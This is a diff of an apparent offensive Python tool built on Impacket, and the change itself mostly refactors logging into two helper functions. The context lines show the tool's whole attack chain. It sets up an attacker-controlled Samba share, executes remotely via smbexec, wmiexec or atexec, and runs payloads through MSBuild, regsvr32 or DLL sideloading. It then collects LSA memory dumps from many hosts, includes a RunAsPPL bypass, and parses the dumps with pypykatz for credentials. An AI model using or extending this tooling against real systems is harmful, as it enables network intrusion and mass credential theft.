@@ -22,7 +22,6 @@ from datetime import datetime
 from pebble import ProcessPool
 from argparse import RawTextHelpFormatter
 
-
 from six import PY2
 from impacket import version
 from impacket import smbserver
@@ -77,14 +76,28 @@ reaper_banner = """
 
 cwd = os.path.abspath(os.path.dirname(__file__))
 
-with open('{}/log.txt'.format(cwd), 'a') as f:
-    f.write('{}{}{}'.format('\n', timestamp, '\n'))
-    f.close()
 
-with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-    f.write('{}{}{}'.format('\n', timestamp, '\n'))
-    f.close()
+def lognoprint(logme):
+    with open('{}/log.txt'.format(cwd), 'a') as f:
+        f.write(logme + '\n')
+        f.close()
 
+    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+        f.write(logme + '\n')
+        f.close()
+
+def printnlog(printlogme):
+    with open('{}/log.txt'.format(cwd), 'a') as f:
+        f.write(printlogme + '\n')
+        f.close()
+
+    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+        f.write(printlogme + '\n')
+        f.close()
+
+    print(printlogme)
+
+lognoprint('\n{}{}{}\n'.format(color_PURP, timestamp, color_reset))
 
 ################################################ Start of SMBEXEC ###############################################################
 
@@ -176,7 +189,7 @@ class SMBEXECShell():
                 command2run = command2run[command2run.find('&&') + 3:]
                 tmphold = self.send_data(command2run[:command2run.find('&')], addr)
             else:
-                print('{}: {}'.format(addr, tmphold))
+                printnlog('{}: {}'.format(addr, tmphold))
 
     def finish(self):
         # Just in case the service is still created
@@ -222,12 +235,8 @@ class SMBEXECShell():
         command += ' & ' + '%COMSPEC% /Q /c del ' + self.__batchFile
 
         logging.debug('Executing %s' % command)
-        with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write('{}: {}\n'.format(addr, 'Executing %s' % command))
-            f.close()
-        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-            f.write('{}: {}\n'.format(addr, 'Executing %s' % command))
-            f.close()
+        lognoprint('{}: {}\n'.format(addr, 'Executing %s' % command))
+
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                      lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
         service = resp['lpServiceHandle']
@@ -250,26 +259,14 @@ class SMBEXECShell():
                 f.write(data_out)
                 f.close()
 
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, data_out))
-                f.close()
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, data_out))
-                f.close()
+            lognoprint('{}: {}\n'.format(addr, data_out))
 
             return data_out
         except UnicodeDecodeError:
             logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                           'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                           'again with -codec and the corresponding codec')
-            print(self.__outputBuffer.decode(CODEC, errors='replace'))
-
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
-                f.close()
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
-                f.close()
+            printnlog('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
 
         self.__outputBuffer = b''
 
@@ -311,12 +308,7 @@ class TSCH_EXEC:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, e))
-                f.close()
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, e))
-                f.close()
+            lognoprint('{}: {}\n'.format(addr, e))
             logging.error('{}: {}'.format(addr, e))
             if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                 logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')
@@ -324,19 +316,14 @@ class TSCH_EXEC:
     def doStuff(self, rpctransport, addr):
         def output_callback(data):
             try:
-                with open('{}/log.txt'.format(cwd), 'a') as f:
-                    f.write('{}: {}\n'.format(addr, data.decode(CODEC)))
-                    f.close()
-                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                    f.write('{}: {}\n'.format(addr, data.decode(CODEC)))
-                    f.close()
+                lognoprint('{}: {}\n'.format(addr, data.decode(CODEC)))
                 if logging.getLogger().level == logging.DEBUG:
                     print('{}: {}'.format(addr, data.decode(CODEC)))
             except UnicodeDecodeError:
                 logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                               'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                               'again with -codec and the corresponding codec')
-                print(data.decode(CODEC, errors='replace'))
+                printnlog('{}: {}'.format(addr, data.decode(CODEC, errors='replace')))
 
         def xml_escape(data):
             replace_table = {
@@ -418,23 +405,13 @@ class TSCH_EXEC:
                (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
         taskCreated = False
         try:
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                f.write('{}: Creating task \\{}\n'.format(addr, tmpName))
-                f.close()
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                f.write('{}: Creating task \\{}\n'.format(addr, tmpName))
-                f.close()
+            lognoprint('{}: Creating task \\{}\n'.format(addr, tmpName))
             if logging.getLogger().level == logging.DEBUG:
                 logging.info('{}: Creating task \\{}'.format(addr, tmpName))
             tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
             taskCreated = True
 
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                f.write('{}: Running task \\{}\n'.format(addr, tmpName))
-                f.close()
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                f.write('{}: Running task \\{}\n'.format(addr, tmpName))
-                f.close()
+            lognoprint('{}: Running task \\{}\n'.format(addr, tmpName))
             if logging.getLogger().level == logging.DEBUG:
                 logging.info('{}: Running task \\{}'.format(addr, tmpName))
             done = False
@@ -458,12 +435,7 @@ class TSCH_EXEC:
                     done = True
                 else:
                     time.sleep(2)
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                f.write('{}: Deleting task \\{}\n'.format(addr, tmpName))
-                f.close()
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                f.write('{}: Deleting task \\{}\n'.format(addr, tmpName))
-                f.close()
+            lognoprint('{}: Deleting task \\{}\n'.format(addr, tmpName))
             if logging.getLogger().level == logging.DEBUG:
                 logging.info('{}: Deleting task \\{}'.format(addr, tmpName))
             tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
@@ -488,12 +460,7 @@ class TSCH_EXEC:
         while True:
             try:
                 time.sleep(6)
-                with open('{}/log.txt'.format(cwd), 'a') as f:
-                    f.write('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
-                    f.close()
-                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                    f.write('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
-                    f.close()
+                lognoprint('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
                 if logging.getLogger().level == logging.DEBUG:
                     logging.info('{}: Attempting to read ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
                 smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
@@ -510,12 +477,7 @@ class TSCH_EXEC:
                         raise
                 else:
                     raise
-        with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
-            f.close()
-        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-            f.write('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
-            f.close()
+        lognoprint('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('{}: Deleting file ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
         smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)
@@ -555,27 +517,15 @@ class WMIEXEC:
                                             self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
 
             dialect = smbConnection.getDialect()
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                if dialect == SMB_DIALECT:
-                    f.write("{}: SMBv1 dialect used\n".format(addr))
-                elif dialect == SMB2_DIALECT_002:
-                    f.write("{}: SMBv2.0 dialect used\n".format(addr))
-                elif dialect == SMB2_DIALECT_21:
-                    f.write("{}: SMBv2.1 dialect used\n".format(addr))
-                else:
-                    f.write("{}: SMBv3.0 dialect used\n".format(addr))
-                f.close()
 
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                if dialect == SMB_DIALECT:
-                    f.write("{}: SMBv1 dialect used\n".format(addr))
-                elif dialect == SMB2_DIALECT_002:
-                    f.write("{}: SMBv2.0 dialect used\n".format(addr))
-                elif dialect == SMB2_DIALECT_21:
-                    f.write("{}: SMBv2.1 dialect used\n".format(addr))
-                else:
-                    f.write("{}: SMBv3.0 dialect used\n".format(addr))
-                f.close()
+            if dialect == SMB_DIALECT:
+                lognoprint("{}: SMBv1 dialect used\n".format(addr))
+            elif dialect == SMB2_DIALECT_002:
+                lognoprint("{}: SMBv2.0 dialect used\n".format(addr))
+            elif dialect == SMB2_DIALECT_21:
+                lognoprint("{}: SMBv2.1 dialect used\n".format(addr))
+            else:
+                lognoprint("{}: SMBv3.0 dialect used\n".format(addr))
 
             if logging.getLogger().level == logging.DEBUG:
                 if dialect == SMB_DIALECT:
@@ -605,12 +555,7 @@ class WMIEXEC:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
-            with open('{}/log.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, str(e)))
-                f.close()
-            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                f.write('{}: {}\n'.format(addr, str(e)))
-                f.close()
+            lognoprint('{}: {}\n'.format(addr, str(e)))
             logging.error('{}: {}'.format(addr, str(e)))
             if smbConnection is not None:
                 smbConnection.logoff()
@@ -674,7 +619,7 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote(line)
             if len(self.__outputBuffer.strip('\r\n')) > 0:
                 # Something went wrong
-                print(self.__outputBuffer)
+                printnlog(self.__outputBuffer)
                 self.__outputBuffer = ''
             else:
                 # Drive valid, now we should get the current path
@@ -737,12 +682,7 @@ class RemoteShell(cmd.Cmd):
         with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
             f.write(self.__outputBuffer)
             f.close()
-        with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write(self.__outputBuffer + '\n')
-            f.close()
-        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-            f.write(self.__outputBuffer + '\n')
-            f.close()
+        lognoprint(self.__outputBuffer + '\n')
         if logging.getLogger().level == logging.DEBUG:
             print(self.__outputBuffer)
         self.__outputBuffer = ''
@@ -800,7 +740,7 @@ def load_smbclient_auth_file(path):
 ############################################################################### END OF WMIEXEC#####################################################
 
 def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
-    print('\n[scanning hosts]')
+    printnlog('\n[scanning hosts]')
     scanner = nmap.PortScanner()
     if os.path.isfile(inpu):  # if its in a file the arguments are different
         scanner.scan(arguments='-n -sn -iL {}'.format(inpu))
@@ -813,7 +753,7 @@ def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan t
     except:
         pass
 
-    print('[scan complete]')
+    printnlog('[scan complete]')
 
     return uphosts
 
@@ -1067,9 +1007,9 @@ def setup_share():
     else:
         share_group = options.sharegroup
 
-    print("\n[Generating share]")
+    printnlog("\n[Generating share]")
     # making the directory
-    print("{} Creating the share folder".format(green_plus))
+    printnlog("{} Creating the share folder".format(green_plus))
     os.system("sudo mkdir /var/tmp/" + share_name)
 
     # smb.conf edits
@@ -1088,32 +1028,32 @@ def setup_share():
     """.format(share_name, share_name, share_user, share_group)
 
     # copy old smb.conf file so its safe
-    print("{} Backing up the smb.conf file".format(green_plus))
+    printnlog("{} Backing up the smb.conf file".format(green_plus))
     os.system("sudo cp /etc/samba/smb.conf " + cwd + "/")
-    print("{} Making modifications".format(green_plus))
+    printnlog("{} Making modifications".format(green_plus))
     with open('/etc/samba/smb.conf', 'a') as f:
         f.write(data)
         f.close()
 
     # create the user for the share
     # generate the group
-    print("{} Creating the group: {}".format(green_plus, share_group))
+    printnlog("{} Creating the group: {}".format(green_plus, share_group))
     os.system("sudo groupadd --system " + share_group)
     # make the user
     print("{} Creating the user: {}".format(green_plus, share_user))
     os.system("sudo useradd --system --no-create-home --group " + share_group + " -s /bin/false " + share_user)
     # give the user access to the share folder
-    print("{} Giving the user rights".format(green_plus))
+    printnlog("{} Giving the user rights".format(green_plus))
     os.system("sudo chown -R " + share_user + ":" + share_group + " /var/tmp/" + share_name)
     # expand access to the group
-    print("{} Giving the group rights".format(green_plus))
+    printnlog("{} Giving the group rights".format(green_plus))
     os.system("sudo chmod -R g+w /var/tmp/" + share_name)
     # create the smbusers password
-    print("{} Editing the SMB password".format(green_plus))
+    printnlog("{} Editing the SMB password".format(green_plus))
     proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
     proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
     # restart the smb service
-    print("{}[+]{} Restarting the SMB service".format(color_BLU, color_reset))
+    printnlog("{}[+]{} Restarting the SMB service".format(color_BLU, color_reset))
     os.system("sudo systemctl restart smbd")
 
     return share_name, share_user, share_pass, payload_name, share_group
@@ -1121,20 +1061,20 @@ def setup_share():
 
 def alt_exec():
     yes = input('Press enter to exit ')
-    print("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
+    printnlog("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
 
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
         os.system('sudo rm {}/drives.txt'.format(cwd))
 
     try:
         os.system("sudo systemctl stop smbd")
-        print(green_plus + " Stopped the smbd service")
+        printnlog(green_plus + " Stopped the smbd service")
     except BaseException as e:
         pass
 
     try:
         os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
-        print(green_plus + " Cleaned up the smb.conf file")
+        printnlog(green_plus + " Cleaned up the smb.conf file")
     except BaseException as e:
         pass
 
@@ -1145,13 +1085,13 @@ def alt_exec():
 
     try:
         os.system("sudo userdel " + share_user)
-        print(green_plus + " Removed the user: " + share_user)
+        printnlog(green_plus + " Removed the user: " + share_user)
     except BaseException as e:
         pass
 
     try:
         os.system("sudo groupdel " + share_group)
-        print(green_plus + " Removed the group: " + share_group)
+        printnlog(green_plus + " Removed the group: " + share_group)
     except BaseException as e:
         pass
 
@@ -1184,16 +1124,11 @@ def exec_netuse(ip, domain):
             import traceback
 
             traceback.print_exc()
-        with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write('{}: {}\n'.format(ip, str(e)))
-            f.close()
-        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-            f.write('{}: {}\n'.format(ip, str(e)))
-            f.close()
+        lognoprint('{}: {}\n'.format(ip, str(e)))
 
 
 def auto_drive(addresses, domain):  # really helpful so you dont have to know which drive letter to use
-    print('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
+    printnlog('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
     failed_logons = 0
 
     if len(addresses) > 2 and options.localauth == False:  # Anti lockout check
@@ -1213,12 +1148,7 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
                     import traceback
 
                     traceback.print_exc()
-                with open('{}/log.txt'.format(cwd), 'a') as f:
-                    f.write('{}: {}\n'.format(addresses[x], str(e)))
-                    f.close()
-                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                    f.write('{}: {}\n'.format(addresses[x], str(e)))
-                    f.close()
+                lognoprint('{}: {}\n'.format(addresses[x], str(e)))
 
                 if str(e).find('STATUS_LOGON_FAILURE') != -1 and options.localauth == False:  # way to track failed logins to see if they're gonna lock the account out
                     logging.error('{}: {}'.format(addresses[x], str(e)))
@@ -1227,16 +1157,16 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
                 if failed_logons >= 3 and options.localauth == False:
                     cont = input('{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(color_YELL, color_reset, failed_logons))
                     if cont.lower() == 'n':
-                        print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
+                        printnlog("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
                         try:
                             os.system("sudo systemctl stop smbd")
-                            print(green_plus + " Stopped the smbd service")
+                            printnlog(green_plus + " Stopped the smbd service")
                         except BaseException as e:
                             pass
 
                         try:
                             os.system("sudo cp " + cwd + "{}/smb.conf /etc/samba/smb.conf")
-                            print(green_plus + " Cleaned up the smb.conf file")
+                            printnlog(green_plus + " Cleaned up the smb.conf file")
                         except BaseException as e:
                             pass
 
@@ -1247,13 +1177,13 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
 
                         try:
                             os.system("sudo userdel " + share_user)
-                            print(green_plus + " Removed the user: " + share_user)
+                            printnlog(green_plus + " Removed the user: " + share_user)
                         except BaseException as e:
                             pass
 
                         try:
                             os.system("sudo groupdel " + share_group)
-                            print(green_plus + " Removed the group: " + share_group)
+                            printnlog(green_plus + " Removed the group: " + share_group)
                         except BaseException as e:
                             pass
 
@@ -1284,12 +1214,7 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
                     traceback.print_exc()
-                with open('{}/log.txt'.format(cwd), 'a') as f:
-                    f.write(str(e) + '\n')
-                    f.close()
-                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                    f.write(str(e) + '\n')
-                    f.close()
+                lognoprint(str(e) + '\n')
                 logging.error(str(e))
                 continue
             except KeyboardInterrupt as e:
@@ -1322,8 +1247,8 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
             return item
 
     least_common = collections.Counter(cleaned_outdata).most_common()[-1]
-    print('{}[!]{} Between every machine all drive letters are in use'.format(color_YELL, color_reset))
-    print('{}[*]{} The least used drive letter is {}: it is available on {}/{} machines\n'.format(color_BLU, color_reset, least_common[0], (len(addresses) - least_common[1]), len(addresses)))
+    printnlog('{}[!]{} Between every machine all drive letters are in use'.format(color_YELL, color_reset))
+    printnlog('{}[*]{} The least used drive letter is {}: it is available on {}/{} machines\n'.format(color_BLU, color_reset, least_common[0], (len(addresses) - least_common[1]), len(addresses)))
 
     yn = input('Would you like to use {}: as the drive letter if not we exit ps. the program will hang on the machines that have the drive mounted (y/N) '.format(least_common[0]))
     if yn.lower() == 'y':
@@ -1333,7 +1258,7 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
 
 
 def mt_execute(ip):  # multithreading requires a function
-    print("{} Attacking {}".format(green_plus, ip))
+    printnlog("{} Attacking {}".format(green_plus, ip))
     try:
         if options.method == 'wmiexec':
             executer = WMIEXEC(command, username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
@@ -1345,18 +1270,13 @@ def mt_execute(ip):  # multithreading requires a function
             executer = CMDEXEC(command, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                                options.share, 445, options.service_name, 'cmd')
             executer.run(ip, ip)
-        print("{} {}: Completed".format(green_plus, ip))
+        printnlog("{} {}: Completed".format(green_plus, ip))
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
 
             traceback.print_exc()
-        with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write('{}: {}\n'.format(ip, str(e)))
-            f.close()
-        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-            f.write('{}: {}\n'.format(ip, str(e)))
-            f.close()
+        lognoprint('{}: {}\n'.format(ip, str(e)))
         logging.error('{}: {}'.format(ip, str(e)))
         pass
 
@@ -1365,14 +1285,14 @@ def mt_execute(ip):  # multithreading requires a function
 if __name__ == '__main__':
     # quick checks to see if were good
     if sys.platform != "linux":
-        print("[!] This program is Linux only")
+        printnlog("[!] This program is Linux only")
         exit(1)
 
     if os.path.isdir(cwd + "/loot") == False:
         os.makedirs(cwd + "/loot")
 
-    print(reaper_banner)
-    print(version.BANNER)
+    printnlog(reaper_banner)
+    printnlog(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description="", epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)
     if '-oe' not in sys.argv:  # if were using another exec method we dont need to get target
@@ -1419,13 +1339,12 @@ if __name__ == '__main__':
                                                                       "See smbclient man page's -A option.")
     group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
 
-
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
 
     if os.geteuid() != 0:
-        print("[!] Must be run as sudo")
+        printnlog("[!] Must be run as sudo")
         exit(1)
 
     options = parser.parse_args()
@@ -1433,20 +1352,20 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init(options.ts)
 
-    if "-share" not in sys.argv and options.method == "wmiexec": # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
+    if "-share" not in sys.argv and options.method == "wmiexec":  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
         options.share = "ADMIN$"
 
-    if options.runasppl and options.method != "smbexec": # check to see if they are trying to run runasppl bypass with something other than smbexec
-        print("{}[!]{} RunAsPPL Bypass only works with the SMBExec method".format(color_RED, color_reset))
+    if options.runasppl and options.method != "smbexec":  # check to see if they are trying to run runasppl bypass with something other than smbexec
+        printnlog("{}[!]{} RunAsPPL Bypass only works with the SMBExec method".format(color_RED, color_reset))
         sys.exit(0)
 
-    if options.runasppl and options.payload != "msbuild": # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
-        print("{}[!]{} RunAsPPL Bypass only works with the MsBuild payload".format(color_RED, color_reset))
+    if options.runasppl and options.payload != "msbuild":  # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
+        printnlog("{}[!]{} RunAsPPL Bypass only works with the MsBuild payload".format(color_RED, color_reset))
         sys.exit(0)
 
     if options.runasppl:
         if options.debug == False:
-            print("I HIGHLY recommend turning on -debug")
+            printnlog("I HIGHLY recommend turning on -debug")
         plzno = input("{}[!]{} RunAsPPL Bypass uses a kernel driver which theoretically can cause a BSOD are you absolutely sure you want to use this? Also this only works every other time (y/N): ".format(color_YELL, color_reset))
         if plzno.lower() != 'y':
             sys.exit(0)
@@ -1519,9 +1438,9 @@ if __name__ == '__main__':
             try:  # check to see if the interface has an ip
                 if local_ip in ifaces:
                     local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
-                    print("local IP => " + local_ip)
+                    printnlog("local IP => " + local_ip)
             except BaseException as exc:
-                print('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
+                printnlog('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
                 exit(0)
         else:
             # print local interfaces and ips
@@ -1529,7 +1448,7 @@ if __name__ == '__main__':
             ifaces = ni.interfaces()
             for face in ifaces:
                 try:  # check to see if the interface has an ip
-                    print(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
+                    printnlog(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
                 except BaseException as exc:
                     continue
 
@@ -1538,23 +1457,23 @@ if __name__ == '__main__':
             # lets you enter eth0 as the ip
             if local_ip in ifaces:
                 local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
-                print("local IP => " + local_ip)
+                printnlog("local IP => " + local_ip)
 
         if '-oe' not in sys.argv:  # why scan if we not gonna do anything
             addresses = do_ip(address, local_ip)  # gets a list of up hosts
-            
-            if len(addresses) < 1: # ensure that there are targets otherwise whats the point
-                print("{}[!]{} There are no targets up or the provided list is empty.".format(color_RED, color_reset))
+
+            if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
+                printnlog("{}[!]{} There are no targets up or the provided list is empty.".format(color_RED, color_reset))
                 exit(0)
 
             if len(addresses) > 500:  # ensure that they dont waste over 25 gb of storage
-                print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses) * 52) / 1024)))
+                printnlog("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses) * 52) / 1024)))
                 choice = input("(N/y): ")
                 if choice.lower() == 'n':
                     exit(0)
 
         share_name, share_user, share_pass, payload_name, share_group = setup_share()  # creates and starts our share
-        print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
+        printnlog("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
 
         # automatically find the best drive to use
         if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
@@ -1573,7 +1492,7 @@ if __name__ == '__main__':
             gen_payload_dllsideload(share_name, addresses)
 
         if options.oe == False:
-            print("\n[This is where the fun begins]\n{} Executing {} via {}\n".format(green_plus, options.payload, options.method))
+            printnlog("\n[This is where the fun begins]\n{} Executing {} via {}\n".format(green_plus, options.payload, options.method))
 
         if options.payload == 'msbuild':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
@@ -1584,19 +1503,13 @@ if __name__ == '__main__':
         elif options.payload == 'dllsideload':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
 
-        print(command)
-        print("")
+        printnlog(command)
+        printnlog("")
 
         if options.oe:
             alt_exec()
 
-        with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write('Total targets: {}\n'.format(len(addresses)))
-            f.close()
-        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-            f.write('Total targets: {}\n'.format(len(addresses)))
-            f.close()
-        print('Total targets: {}'.format(len(addresses)))
+        printnlog('Total targets: {}'.format(len(addresses)))
         # multithreading yeah
         with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
             for ip in addresses:
@@ -1609,12 +1522,7 @@ if __name__ == '__main__':
                         import traceback
 
                         traceback.print_exc()
-                    with open('{}/log.txt'.format(cwd), 'a') as f:
-                        f.write(str(e) + '\n')
-                        f.close()
-                    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-                        f.write(str(e) + '\n')
-                        f.close()
+                    lognoprint(str(e) + '\n')
                     logging.error(str(e))
                     continue
                 except KeyboardInterrupt as e:
@@ -1623,20 +1531,14 @@ if __name__ == '__main__':
         time.sleep(2)
         os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
 
-        with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write('Total Extracted LSA: {}/{}\n'.format(len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
-            f.close()
-        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
-            f.write('Total Extracted LSA: {}/{}\n'.format(len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
-            f.close()
         # for when you're attacking a lot of targets to quickly see how many we got
-        print('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
+        printnlog('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
 
         if options.ap != False:
-            print("\n[parsing files]")
+            printnlog("\n[parsing files]")
             os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
             os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
